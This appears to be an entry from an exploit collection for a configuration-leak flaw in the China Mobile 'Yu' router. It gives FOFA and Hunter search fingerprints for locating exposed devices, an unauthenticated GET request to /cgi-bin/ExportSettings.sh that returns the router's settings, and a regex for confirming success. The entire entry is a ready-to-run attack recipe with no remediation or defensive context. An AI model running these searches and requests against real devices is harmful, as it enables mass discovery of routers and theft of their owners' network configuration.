# 中国移动禹路由-信息泄露-ExportSettings.sh

中国移动禹路由 ｜ 信息泄露 ｜ —
- **指纹**：`fofa：title="互联世界 物联未来-登录" 或 鹰图：web.body="互联世界 物联未来-登录"`
- **请求**：`GET /cgi-bin/ExportSettings.sh HTTP/1.1`
- **响应特征**：200 ^(?=.*?wan_ipaddr)(?=.*?HostName).*?$